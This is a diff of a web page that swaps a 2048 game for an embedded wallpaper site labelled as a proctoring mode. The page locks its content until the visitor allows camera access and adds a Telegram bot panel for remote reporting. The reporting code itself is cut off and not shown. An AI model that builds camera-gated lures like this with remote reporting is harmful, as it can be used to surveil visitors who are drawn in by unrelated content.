@@ -2,210 +2,181 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>2048</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>壁纸 · 监考模式</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   html, body {
-    height: 100%;
+    min-height: 100%;
     font-family: "Helvetica Neue", Arial, "PingFang SC", "Microsoft YaHei", sans-serif;
-    background: linear-gradient(135deg, #faf8ef 0%, #f0e6d2 100%);
-    color: #776e65;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: #e8e8e8;
+  }
+  body {
     display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-    user-select: none;
+    flex-direction: column;
+    min-height: 100vh;
   }
   .container {
-    width: min(92vw, 480px);
-    padding: 16px;
+    width: 100%;
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 12px;
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+    min-height: 100vh;
   }
   .header {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    margin-bottom: 16px;
+    margin-bottom: 12px;
+    color: #fff;
   }
   .title {
-    font-size: 56px;
-    font-weight: 800;
-    color: #776e65;
-    letter-spacing: -2px;
-  }
-  .scores {
-    display: flex;
-    gap: 8px;
-  }
-  .score-box {
-    background: #bbada0;
-    color: #fff;
-    padding: 8px 16px;
-    border-radius: 6px;
-    text-align: center;
-    min-width: 70px;
-  }
-  .score-label {
-    font-size: 11px;
-    text-transform: uppercase;
-    color: #eee4da;
+    font-size: 24px;
     font-weight: 700;
     letter-spacing: 1px;
+    background: linear-gradient(90deg, #6dd5ed, #2193b0);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
   }
-  .score-value {
-    font-size: 22px;
-    font-weight: 800;
-    line-height: 1.2;
-  }
-  .subbar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 14px;
-    font-size: 14px;
-    color: #776e65;
-  }
-  .new-game {
-    background: #8f7a66;
-    color: #f9f6f2;
-    border: none;
-    padding: 10px 18px;
+  .open-link {
+    background: rgba(255, 255, 255, 0.1);
+    color: #6dd5ed;
+    border: 1px solid rgba(109, 213, 237, 0.4);
+    padding: 6px 14px;
     border-radius: 6px;
-    font-weight: 700;
-    cursor: pointer;
-    font-size: 14px;
-    transition: background 0.15s;
+    text-decoration: none;
+    font-size: 12px;
+    font-weight: 600;
+    transition: all 0.2s;
   }
-  .new-game:hover { background: #7c6857; }
-  .new-game:active { transform: scale(0.97); }
+  .open-link:hover { background: rgba(109, 213, 237, 0.2); }
 
-  .board-wrap {
-    position: relative;
-    background: #bbada0;
-    border-radius: 8px;
-    padding: 12px;
-    width: 100%;
-    aspect-ratio: 1 / 1;
-    touch-action: none;
-  }
-  .grid-bg, .grid-tiles {
-    position: absolute;
-    inset: 12px;
+  /* 顶部布局：左侧主区域 + 右侧摄像头侧栏 */
+  .main-layout {
     display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    grid-template-rows: repeat(4, 1fr);
-    gap: 10px;
+    grid-template-columns: 1fr 320px;
+    gap: 14px;
+    flex: 1;
+    min-height: 0;
   }
-  .cell {
-    background: rgba(238, 228, 218, 0.35);
-    border-radius: 6px;
-  }
-  .grid-tiles { pointer-events: none; }
-  .tile {
-    position: absolute;
-    border-radius: 6px;
+  .main-left {
     display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: 800;
-    transition: transform 0.13s ease-in-out;
-    will-change: transform;
+    flex-direction: column;
+    gap: 12px;
+    min-width: 0;
+    min-height: 0;
   }
-  .tile-inner {
+  .main-right {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    min-width: 0;
+  }
+  @media (max-width: 900px) {
+    .main-layout { grid-template-columns: 1fr; }
+    .main-right { order: -1; }
+  }
+
+  /* 壁纸 iframe 区 */
+  .wallpaper-wrap {
+    position: relative;
+    flex: 1;
+    min-height: 600px;
+    background: #0f1729;
+    border-radius: 10px;
+    overflow: hidden;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
+  }
+  .wallpaper-wrap iframe {
     width: 100%;
     height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border-radius: 6px;
-    animation: pop 0.18s ease;
-  }
-  .tile-merged .tile-inner { animation: merged 0.2s ease; }
-  @keyframes pop {
-    0% { transform: scale(0); }
-    100% { transform: scale(1); }
-  }
-  @keyframes merged {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.18); }
-    100% { transform: scale(1); }
-  }
-
-  .v-2    { background: #eee4da; color: #776e65; }
-  .v-4    { background: #ede0c8; color: #776e65; }
-  .v-8    { background: #f2b179; color: #f9f6f2; }
-  .v-16   { background: #f59563; color: #f9f6f2; }
-  .v-32   { background: #f67c5f; color: #f9f6f2; }
-  .v-64   { background: #f65e3b; color: #f9f6f2; }
-  .v-128  { background: #edcf72; color: #f9f6f2; }
-  .v-256  { background: #edcc61; color: #f9f6f2; }
-  .v-512  { background: #edc850; color: #f9f6f2; }
-  .v-1024 { background: #edc53f; color: #f9f6f2; }
-  .v-2048 { background: #edc22e; color: #f9f6f2; box-shadow: 0 0 22px rgba(243, 215, 116, 0.8); }
-  .v-super { background: #3c3a32; color: #f9f6f2; }
-
-  .overlay {
-    position: absolute;
-    inset: 12px;
-    border-radius: 6px;
-    background: rgba(238, 228, 218, 0.73);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    flex-direction: column;
-    z-index: 10;
-    text-align: center;
-    padding: 20px;
-  }
-  .overlay.show { display: flex; animation: fadeIn 0.4s ease; }
-  .overlay.win { background: rgba(237, 194, 46, 0.5); color: #f9f6f2; }
-  .overlay-title {
-    font-size: 48px;
-    font-weight: 800;
-    margin-bottom: 18px;
-  }
-  .overlay-actions { display: flex; gap: 10px; }
-  .overlay button {
-    background: #8f7a66;
-    color: #f9f6f2;
     border: none;
-    padding: 10px 16px;
-    border-radius: 6px;
-    font-weight: 700;
-    cursor: pointer;
-    font-size: 14px;
+    display: block;
   }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-  .hint {
+  .wallpaper-fallback {
+    position: absolute;
+    inset: 0;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    color: #e8e8e8;
     text-align: center;
-    margin-top: 14px;
-    font-size: 13px;
-    color: #776e65;
-    line-height: 1.6;
+    padding: 30px;
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
   }
-  .hint b { color: #8f7a66; }
+  .wallpaper-fallback.show { display: flex; }
+  .wallpaper-fallback h2 { font-size: 22px; margin-bottom: 12px; color: #ff6b6b; }
+  .wallpaper-fallback p { font-size: 14px; line-height: 1.8; opacity: 0.85; max-width: 480px; }
+  .wallpaper-fallback a {
+    margin-top: 18px;
+    background: #6dd5ed;
+    color: #0f1729;
+    padding: 10px 22px;
+    border-radius: 6px;
+    text-decoration: none;
+    font-weight: 700;
+  }
+  .wallpaper-toolbar {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+  .wp-btn {
+    background: rgba(255, 255, 255, 0.08);
+    color: #e8e8e8;
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    padding: 6px 14px;
+    border-radius: 6px;
+    font-size: 12px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .wp-btn:hover { background: rgba(109, 213, 237, 0.2); border-color: rgba(109, 213, 237, 0.5); }
+  .wp-btn.active { background: rgba(109, 213, 237, 0.25); border-color: #6dd5ed; color: #6dd5ed; }
+  .wp-info { color: #999; font-size: 12px; margin-left: auto; }
 
-  .tile.len-1 { font-size: clamp(28px, 8vw, 46px); }
-  .tile.len-2 { font-size: clamp(26px, 7.5vw, 42px); }
-  .tile.len-3 { font-size: clamp(22px, 6vw, 36px); }
-  .tile.len-4 { font-size: clamp(18px, 5vw, 30px); }
-  .tile.len-5 { font-size: clamp(15px, 4vw, 24px); }
+  /* 锁定遮罩（未授权摄像头时盖住壁纸区）*/
+  .lock-overlay {
+    position: absolute;
+    inset: 0;
+    z-index: 50;
+    border-radius: 10px;
+    background: rgba(15, 23, 41, 0.95);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    color: #f9f6f2;
+    text-align: center;
+    padding: 30px;
+    backdrop-filter: blur(8px);
+  }
+  .lock-overlay.hidden { display: none; }
+  .lock-icon { font-size: 56px; margin-bottom: 14px; }
+  .lock-title { font-size: 22px; font-weight: 800; margin-bottom: 10px; color: #ff6b6b; }
+  .lock-desc { font-size: 14px; line-height: 1.7; opacity: 0.9; max-width: 380px; }
 
-  /* 内嵌摄像头区域（在棋盘上方） */
+  /* 内嵌摄像头区域（侧栏） */
   .cam-inline {
     position: relative;
-    background: #2c2a26;
-    border: 2px solid #8f7a66;
-    border-radius: 8px;
+    background: #0f1729;
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 10px;
     overflow: hidden;
-    margin-bottom: 14px;
-    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.18);
+    box-shadow: 0 3px 12px rgba(0, 0, 0, 0.3);
   }
   .cam-inline-header {
-    background: #8f7a66;
-    color: #f9f6f2;
-    padding: 5px 10px;
+    background: linear-gradient(90deg, #2193b0, #6dd5ed);
+    color: #fff;
+    padding: 6px 12px;
     font-size: 12px;
     font-weight: 700;
     display: flex;
@@ -232,7 +203,7 @@
     position: relative;
     background: #000;
     width: 100%;
-    height: 140px;
+    height: 200px;
   }
   .cam-stage video {
     width: 100%;
@@ -252,7 +223,7 @@
     font-size: 12px;
     text-align: center;
     padding: 10px;
-    background: rgba(0, 0, 0, 0.85);
+    background: rgba(0, 0, 0, 0.88);
     white-space: pre-line;
     line-height: 1.6;
   }
@@ -269,55 +240,33 @@
   }
   .cam-error button:hover { background: #c25656; }
 
-  /* 游戏锁定遮罩（未授权摄像头时盖住棋盘） */
-  .lock-overlay {
-    position: absolute;
-    inset: 0;
-    z-index: 50;
-    border-radius: 8px;
-    background: rgba(60, 58, 50, 0.92);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: #f9f6f2;
-    text-align: center;
-    padding: 20px;
-    backdrop-filter: blur(4px);
-  }
-  .lock-overlay.hidden { display: none; }
-  .lock-icon { font-size: 44px; margin-bottom: 10px; }
-  .lock-title { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
-  .lock-desc { font-size: 13px; line-height: 1.6; opacity: 0.9; }
-
   /* Telegram 上报区域 */
   .tg-panel {
-    background: #fff;
-    border: 1px solid #d6c8b6;
-    border-radius: 8px;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-radius: 10px;
     padding: 10px 12px;
-    margin-bottom: 14px;
     font-size: 12px;
-    color: #776e65;
+    color: #d8d8d8;
   }
   .tg-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 6px; }
   .tg-row:last-child { margin-bottom: 0; }
-  .tg-row label { font-weight: 700; min-width: 78px; }
+  .tg-row label { font-weight: 700; min-width: 70px; color: #b8b8b8; }
   .tg-row input {
     flex: 1;
     min-width: 140px;
     padding: 5px 8px;
-    border: 1px solid #d6c8b6;
+    border: 1px solid rgba(255, 255, 255, 0.15);
     border-radius: 4px;
     font-size: 12px;
-    color: #776e65;
-    background: #faf8ef;
+    color: #e8e8e8;
+    background: rgba(0, 0, 0, 0.25);
     font-family: inherit;
   }
-  .tg-row input:focus { outline: none; border-color: #8f7a66; }
+  .tg-row input:focus { outline: none; border-color: #6dd5ed; }
   .tg-btn {
-    background: #8f7a66;
-    color: #f9f6f2;
+    background: #2193b0;
+    color: #fff;
     border: none;
     padding: 5px 12px;
     border-radius: 4px;
@@ -325,23 +274,23 @@
     font-weight: 700;
     cursor: pointer;
   }
-  .tg-btn:hover { background: #7c6857; }
+  .tg-btn:hover { background: #1a7a93; }
   .tg-btn.danger { background: #d96666; }
   .tg-btn.danger:hover { background: #c25656; }
   .tg-btn.success { background: #4caf50; }
-  .tg-btn:disabled { background: #bbb; cursor: not-allowed; }
+  .tg-btn:disabled { background: #555; cursor: not-allowed; }
   .tg-stats {
     display: flex;
     gap: 10px;
     font-size: 11px;
-    color: #998877;
+    color: #999;
     flex-wrap: wrap;
   }
-  .tg-stats b { color: #776e65; }
+  .tg-stats b { color: #d8d8d8; }
   .tg-stats .ok { color: #4caf50; font-weight: 700; }
   .tg-stats .err { color: #d96666; font-weight: 700; }
   .tg-summary {
-    background: #f5efe6;
+    background: rgba(255, 255, 255, 0.06);
     padding: 6px 10px;
     border-radius: 4px;
     cursor: pointer;
@@ -350,387 +299,171 @@
     justify-content: space-between;
     align-items: center;
   }
-  .tg-summary:hover { background: #ede4d3; }
+  .tg-summary:hover { background: rgba(109, 213, 237, 0.12); }
   .tg-summary .arrow { font-size: 10px; transition: transform 0.2s; }
   .tg-panel.collapsed .tg-config { display: none; }
   .tg-panel.collapsed .arrow { transform: rotate(-90deg); }
   .tg-help {
     margin-top: 6px;
     padding: 6px 8px;
-    background: #fffbea;
-    border: 1px dashed #e0c97a;
+    background: rgba(255, 251, 234, 0.08);
+    border: 1px dashed rgba(224, 201, 122, 0.4);
     border-radius: 4px;
     font-size: 11px;
     line-height: 1.5;
-    color: #8a6d1d;
+    color: #c8b87d;
   }
-  .tg-help a { color: #8f7a66; text-decoration: underline; }
+  .tg-help code { background: rgba(0,0,0,0.3); padding: 1px 5px; border-radius: 3px; font-family: Consolas, monospace; color: #6dd5ed; }
 </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <div class="title">2048</div>
-      <div class="scores">
-        <div class="score-box">
-          <div class="score-label">分数</div>
-          <div class="score-value" id="score">0</div>
-        </div>
-        <div class="score-box">
-          <div class="score-label">最高</div>
-          <div class="score-value" id="best">0</div>
-        </div>
-      </div>
-    </div>
-    <div class="subbar">
-      <span>合并相同数字，挑战 <b>2048</b>！</span>
-      <button class="new-game" id="newGame">新游戏</button>
+      <div class="title">🖼️ 壁纸 · 监考模式</div>
+      <a class="open-link" href="https://haowallpaper.com/" target="_blank" rel="noopener">↗ 在新窗口打开</a>
     </div>
 
-    <!-- 内嵌摄像头监控区（强制开启） -->
-    <div class="cam-inline" id="camInline">
-      <div class="cam-inline-header" id="camInlineHeader">
-        <span><span class="dot"></span>监考中</span>
-        <span class="cam-status" id="camStatus">摄像头初始化中…</span>
-      </div>
-      <div class="cam-stage" id="camStage">
-        <video id="camVideo" autoplay playsinline muted></video>
-        <div class="cam-error" id="camError" style="display:none;"></div>
-      </div>
-    </div>
+    <div class="main-layout">
+      <!-- 左侧：壁纸主区 -->
+      <div class="main-left">
+        <div class="wallpaper-toolbar">
+          <button class="wp-btn active" data-url="https://haowallpaper.com/">🏠 首页</button>
+          <button class="wp-btn" data-url="https://haowallpaper.com/homePage/wallpaper">🖼️ 壁纸</button>
+          <button class="wp-btn" data-url="https://haowallpaper.com/homePage/sea">🌊 海景</button>
+          <button class="wp-btn" data-url="https://haowallpaper.com/homePage/animal">🐱 动物</button>
+          <button class="wp-btn" data-url="https://haowallpaper.com/homePage/cartoon">🎨 动漫</button>
+          <button class="wp-btn" data-url="https://haowallpaper.com/homePage/scenery">🏔️ 风景</button>
+          <span class="wp-info" id="wpInfo">加载中...</span>
+        </div>
 
-    <!-- Telegram 上报配置面板 -->
-    <div class="tg-panel collapsed" id="tgPanel">
-      <div class="tg-summary" id="tgSummary">
-        <span>📡 Telegram 远程监控 · <span id="tgStateText">未配置</span></span>
-        <span class="arrow">▼</span>
-      </div>
-      <div class="tg-config" style="margin-top: 10px;">
-        <div class="tg-row">
-          <label>Bot Token</label>
-          <input type="password" id="tgToken" placeholder="123456:ABC-DEF..." autocomplete="off">
-        </div>
-        <div class="tg-row">
-          <label>Chat ID</label>
-          <input type="text" id="tgChatId" placeholder="-1001234567890 或 123456789" autocomplete="off">
-        </div>
-        <div class="tg-row">
-          <button class="tg-btn success" id="tgStart">▶ 开始上报</button>
-          <button class="tg-btn danger" id="tgStop" style="display:none;">⏹ 停止上报</button>
-          <button class="tg-btn" id="tgTest">🧪 测试连接</button>
-          <button class="tg-btn" id="tgClear" style="background:#bbada0;">🗑 清除配置</button>
-        </div>
-        <div class="tg-stats" id="tgStats">
-          <span>状态：<b id="tgRunState">空闲</b></span>
-          <span>已发送：<span class="ok" id="tgOkCount">0</span></span>
-          <span>失败：<span class="err" id="tgErrCount">0</span></span>
-          <span>下次：<b id="tgNext">-</b></span>
-        </div>
-        <div class="tg-help">
-          💡 <b>如何获取？</b>
-          1. 找 <code>@BotFather</code> 发 <code>/newbot</code> 创建机器人 → 拿到 Token<br>
-          2. 把 bot 加入群/频道（或私聊它发条消息）<br>
-          3. 浏览器访问 <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code> → 找到 <code>chat.id</code><br>
-          ⚠️ Token 仅保存在你浏览器 localStorage，不会上传任何服务器
+        <div class="wallpaper-wrap" id="wallpaperWrap">
+          <iframe id="wallpaperFrame" src="https://haowallpaper.com/" allow="autoplay; fullscreen" referrerpolicy="no-referrer"></iframe>
+          <div class="wallpaper-fallback" id="wallpaperFallback">
+            <h2>⚠️ 无法嵌入显示</h2>
+            <p>haowallpaper.com 的服务器拒绝在 iframe 中加载<br>（可能临时增加了 X-Frame-Options 限制）<br><br>请点击下方按钮在新窗口打开。</p>
+            <a href="https://haowallpaper.com/" target="_blank" rel="noopener">在新窗口打开 haowallpaper.com</a>
+          </div>
+          <!-- 锁定遮罩 -->
+          <div class="lock-overlay" id="lockOverlay">
+            <div class="lock-icon">🔒</div>
+            <div class="lock-title">页面已锁定</div>
+            <div class="lock-desc">必须开启摄像头才能浏览壁纸<br>请在浏览器弹窗中点击「允许」</div>
+          </div>
         </div>
       </div>
-    </div>
 
-    <div class="board-wrap" id="board">
-      <div class="grid-bg" id="gridBg"></div>
-      <div class="grid-tiles" id="gridTiles"></div>
-      <div class="overlay" id="overlay">
-        <div class="overlay-title" id="overlayTitle">游戏结束！</div>
-        <div class="overlay-actions">
-          <button id="overlayRestart">再来一局</button>
-          <button id="overlayContinue" style="display:none;">继续挑战</button>
+      <!-- 右侧：摄像头 + Telegram -->
+      <div class="main-right">
+        <div class="cam-inline" id="camInline">
+          <div class="cam-inline-header" id="camInlineHeader">
+            <span><span class="dot"></span>监考中</span>
+            <span class="cam-status" id="camStatus">摄像头初始化中…</span>
+          </div>
+          <div class="cam-stage" id="camStage">
+            <video id="camVideo" autoplay playsinline muted></video>
+            <div class="cam-error" id="camError" style="display:none;"></div>
+          </div>
+        </div>
+
+        <div class="tg-panel collapsed" id="tgPanel">
+          <div class="tg-summary" id="tgSummary">
+            <span>📡 Telegram 远程监控 · <span id="tgStateText">未配置</span></span>
+            <span class="arrow">▼</span>
+          </div>
+          <div class="tg-config" style="margin-top: 10px;">
+            <div class="tg-row">
+              <label>Bot Token</label>
+              <input type="password" id="tgToken" placeholder="123456:ABC-DEF..." autocomplete="off">
+            </div>
+            <div class="tg-row">
+              <label>Chat ID</label>
+              <input type="text" id="tgChatId" placeholder="-1001234567890 或 123456789" autocomplete="off">
+            </div>
+            <div class="tg-row">
+              <button class="tg-btn success" id="tgStart">▶ 开始上报</button>
+              <button class="tg-btn danger" id="tgStop" style="display:none;">⏹ 停止上报</button>
+              <button class="tg-btn" id="tgTest">🧪 测试</button>
+              <button class="tg-btn" id="tgClear" style="background:#666;">🗑 清除</button>
+            </div>
+            <div class="tg-stats" id="tgStats">
+              <span>状态：<b id="tgRunState">空闲</b></span>
+              <span>已发：<span class="ok" id="tgOkCount">0</span></span>
+              <span>失败：<span class="err" id="tgErrCount">0</span></span>
+              <span>下次：<b id="tgNext">-</b></span>
+            </div>
+            <div class="tg-help">
+              💡 <b>如何获取？</b><br>
+              1. 找 <code>@BotFather</code> 发 <code>/newbot</code> 拿 Token<br>
+              2. 私聊机器人发条消息激活<br>
+              3. 访问 <code>api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code> 找 <code>chat.id</code><br>
+              ⚠️ 仅保存在 localStorage
+            </div>
+          </div>
         </div>
       </div>
-      <!-- 未授权摄像头时锁定棋盘 -->
-      <div class="lock-overlay" id="lockOverlay">
-        <div class="lock-icon">🔒</div>
-        <div class="lock-title">游戏已锁定</div>
-        <div class="lock-desc">必须开启摄像头才能开始游戏<br>请在浏览器弹窗中点击「允许」</div>
-      </div>
-    </div>
-
-    <div class="hint">
-      🖥️ 键盘 <b>↑ ↓ ← →</b> 或 <b>WASD</b> 操作　📱 手机滑动屏幕
     </div>
   </div>
 
 <script>
 (function () {
-  const SIZE = 4;
-  const STORAGE_KEY = 'best_2048_score';
+  // ============== 壁纸 iframe 切换 ==============
+  const $frame = document.getElementById('wallpaperFrame');
+  const $fallback = document.getElementById('wallpaperFallback');
+  const $info = document.getElementById('wpInfo');
+  const $wpBtns = document.querySelectorAll('.wp-btn');
 
-  let grid = [];
-  let score = 0;
-  let best = parseInt(localStorage.getItem(STORAGE_KEY) || '0', 10);
-  let won = false;
-  let keepPlaying = false;
-  let over = false;
+  let frameLoadTimer = null;
+  let frameLoaded = false;
 
-  const $score = document.getElementById('score');
-  const $best = document.getElementById('best');
-  const $gridBg = document.getElementById('gridBg');
-  const $gridTiles = document.getElementById('gridTiles');
-  const $board = document.getElementById('board');
-  const $overlay = document.getElementById('overlay');
-  const $overlayTitle = document.getElementById('overlayTitle');
-  const $overlayRestart = document.getElementById('overlayRestart');
-  const $overlayContinue = document.getElementById('overlayContinue');
-
-  for (let i = 0; i < SIZE * SIZE; i++) {
-    const c = document.createElement('div');
-    c.className = 'cell';
-    $gridBg.appendChild(c);
+  function setActiveBtn(targetBtn) {
+    $wpBtns.forEach(b => b.classList.remove('active'));
+    if (targetBtn) targetBtn.classList.add('active');
   }
 
-  function emptyGrid() {
-    return Array.from({ length: SIZE }, () => Array(SIZE).fill(0));
-  }
+  function loadWallpaper(url, btn) {
+    if (!$frame) return;
+    frameLoaded = false;
+    if ($info) $info.textContent = '加载中...';
+    if ($fallback) $fallback.classList.remove('show');
+    setActiveBtn(btn);
+    $frame.src = url;
 
-  function init() {
-    grid = emptyGrid();
-    score = 0;
-    won = false;
-    keepPlaying = false;
-    over = false;
-    addRandomTile();
-    addRandomTile();
-    render();
-    hideOverlay();
-  }
-
-  function addRandomTile() {
-    const empties = [];
-    for (let r = 0; r < SIZE; r++) {
-      for (let c = 0; c < SIZE; c++) {
-        if (grid[r][c] === 0) empties.push([r, c]);
+    // 4 秒后还没触发 load，认为被 X-Frame-Options 拒绝
+    if (frameLoadTimer) clearTimeout(frameLoadTimer);
+    frameLoadTimer = setTimeout(() => {
+      if (!frameLoaded && $fallback) {
+        $fallback.classList.add('show');
+        if ($info) $info.textContent = '⚠️ 嵌入失败';
       }
-    }
-    if (empties.length === 0) return;
-    const [r, c] = empties[Math.floor(Math.random() * empties.length)];
-    grid[r][c] = Math.random() < 0.9 ? 2 : 4;
+    }, 4000);
   }
 
-  function render(mergedSet) {
-    $gridTiles.innerHTML = '';
-    const wrapRect = $board.getBoundingClientRect();
-    const padding = 12;
-    const gap = 10;
-    const cellSize = (wrapRect.width - padding * 2 - gap * (SIZE - 1)) / SIZE;
-
-    for (let r = 0; r < SIZE; r++) {
-      for (let c = 0; c < SIZE; c++) {
-        const v = grid[r][c];
-        if (!v) continue;
-        const tile = document.createElement('div');
-        const valClass = v <= 2048 ? 'v-' + v : 'v-super';
-        tile.className = 'tile ' + valClass + ' len-' + String(v).length;
-        if (mergedSet && mergedSet.has(r + ',' + c)) tile.classList.add('tile-merged');
-        tile.style.width = cellSize + 'px';
-        tile.style.height = cellSize + 'px';
-        tile.style.transform = `translate(${c * (cellSize + gap)}px, ${r * (cellSize + gap)}px)`;
-        const inner = document.createElement('div');
-        inner.className = 'tile-inner';
-        inner.textContent = v;
-        tile.appendChild(inner);
-        $gridTiles.appendChild(tile);
-      }
-    }
-
-    $score.textContent = score;
-    if (score > best) {
-      best = score;
-      localStorage.setItem(STORAGE_KEY, String(best));
-    }
-    $best.textContent = best;
-  }
-
-  function rotateLeft(m) {
-    const n = m.length;
-    const r = emptyGrid();
-    for (let i = 0; i < n; i++) {
-      for (let j = 0; j < n; j++) {
-        r[n - 1 - j][i] = m[i][j];
-      }
-    }
-    return r;
-  }
-  function rotateRight(m) {
-    const n = m.length;
-    const r = emptyGrid();
-    for (let i = 0; i < n; i++) {
-      for (let j = 0; j < n; j++) {
-        r[j][n - 1 - i] = m[i][j];
-      }
-    }
-    return r;
-  }
-
-  function slideRowLeft(row) {
-    const filtered = row.filter(v => v !== 0);
-    const result = [];
-    const mergedCols = new Set();
-    let gained = 0;
-    let i = 0;
-    while (i < filtered.length) {
-      if (i + 1 < filtered.length && filtered[i] === filtered[i + 1]) {
-        const merged = filtered[i] * 2;
-        result.push(merged);
-        gained += merged;
-        if (merged === 2048 && !won) won = true;
-        mergedCols.add(result.length - 1);
-        i += 2;
-      } else {
-        result.push(filtered[i]);
-        i += 1;
-      }
-    }
-    while (result.length < SIZE) result.push(0);
-    return { row: result, gained, mergedCols };
-  }
-
-  // direction: 0=left, 1=up, 2=right, 3=down
-  function move(direction) {
-    if (over) return false;
-
-    let m = grid.map(row => row.slice());
-    for (let i = 0; i < direction; i++) m = rotateLeft(m);
-
-    let moved = false;
-    let gainedTotal = 0;
-    const mergedSet = new Set();
-
-    for (let r = 0; r < SIZE; r++) {
-      const before = m[r].join(',');
-      const { row, gained, mergedCols } = slideRowLeft(m[r]);
-      if (row.join(',') !== before) moved = true;
-      m[r] = row;
-      gainedTotal += gained;
-      mergedCols.forEach(c => mergedSet.add(r + ',' + c));
-    }
-
-    let backMerged = mergedSet;
-    for (let i = 0; i < direction; i++) {
-      m = rotateRight(m);
-      backMerged = rotateMergedSetRight(backMerged, SIZE);
-    }
-
-    if (moved) {
-      grid = m;
-      score += gainedTotal;
-      addRandomTile();
-      render(backMerged);
-
-      if (won && !keepPlaying) {
-        showWin();
-      } else if (isGameOver()) {
-        showOver();
-      }
-    }
-    return moved;
-  }
-
-  function rotateMergedSetRight(set, n) {
-    const next = new Set();
-    set.forEach(key => {
-      const [r, c] = key.split(',').map(Number);
-      next.add(c + ',' + (n - 1 - r));
+  if ($frame) {
+    $frame.addEventListener('load', () => {
+      frameLoaded = true;
+      if (frameLoadTimer) { clearTimeout(frameLoadTimer); frameLoadTimer = null; }
+      if ($info) $info.textContent = '✅ 已加载';
+      if ($fallback) $fallback.classList.remove('show');
     });
-    return next;
-  }
-
-  function isGameOver() {
-    for (let r = 0; r < SIZE; r++) {
-      for (let c = 0; c < SIZE; c++) {
-        if (grid[r][c] === 0) return false;
-        if (c + 1 < SIZE && grid[r][c] === grid[r][c + 1]) return false;
-        if (r + 1 < SIZE && grid[r][c] === grid[r + 1][c]) return false;
+    $frame.addEventListener('error', () => {
+      if ($fallback) $fallback.classList.add('show');
+      if ($info) $info.textContent = '❌ 加载失败';
+    });
+    // 首次加载触发兜底检测
+    setTimeout(() => {
+      if (!frameLoaded && $fallback) {
+        $fallback.classList.add('show');
+        if ($info) $info.textContent = '⚠️ 嵌入失败';
       }
-    }
-    return true;
+    }, 5000);
   }
 
-  function showOver() {
-    over = true;
-    $overlayTitle.textContent = '游戏结束！';
-    $overlay.classList.remove('win');
-    $overlayContinue.style.display = 'none';
-    $overlay.classList.add('show');
-  }
-  function showWin() {
-    $overlayTitle.textContent = '🎉 你赢了！';
-    $overlay.classList.add('win');
-    $overlayContinue.style.display = 'inline-block';
-    $overlay.classList.add('show');
-  }
-  function hideOverlay() {
-    $overlay.classList.remove('show', 'win');
-  }
-
-  const keyMap = {
-    ArrowLeft: 0, a: 0, A: 0,
-    ArrowUp: 1, w: 1, W: 1,
-    ArrowRight: 2, d: 2, D: 2,
-    ArrowDown: 3, s: 3, S: 3
-  };
-  window.addEventListener('keydown', (e) => {
-    if (keyMap.hasOwnProperty(e.key)) {
-      e.preventDefault();
-      move(keyMap[e.key]);
-    }
-  }, { passive: false });
-
-  let touchStartX = 0, touchStartY = 0, touching = false;
-  $board.addEventListener('touchstart', (e) => {
-    if (e.touches.length !== 1) return;
-    touching = true;
-    touchStartX = e.touches[0].clientX;
-    touchStartY = e.touches[0].clientY;
-  }, { passive: true });
-  $board.addEventListener('touchmove', (e) => {
-    if (touching) e.preventDefault();
-  }, { passive: false });
-  $board.addEventListener('touchend', (e) => {
-    if (!touching) return;
-    touching = false;
-    const t = e.changedTouches[0];
-    const dx = t.clientX - touchStartX;
-    const dy = t.clientY - touchStartY;
-    const absX = Math.abs(dx), absY = Math.abs(dy);
-    if (Math.max(absX, absY) < 24) return;
-    if (absX > absY) move(dx > 0 ? 2 : 0);
-    else move(dy > 0 ? 3 : 1);
+  $wpBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const url = btn.getAttribute('data-url');
+      if (url) loadWallpaper(url, btn);
+    });
   });
-
-  let mouseDown = false, mouseStartX = 0, mouseStartY = 0;
-  $board.addEventListener('mousedown', (e) => {
-    mouseDown = true; mouseStartX = e.clientX; mouseStartY = e.clientY;
-  });
-  window.addEventListener('mouseup', (e) => {
-    if (!mouseDown) return;
-    mouseDown = false;
-    const dx = e.clientX - mouseStartX;
-    const dy = e.clientY - mouseStartY;
-    const absX = Math.abs(dx), absY = Math.abs(dy);
-    if (Math.max(absX, absY) < 30) return;
-    if (absX > absY) move(dx > 0 ? 2 : 0);
-    else move(dy > 0 ? 3 : 1);
-  });
-
-  document.getElementById('newGame').addEventListener('click', init);
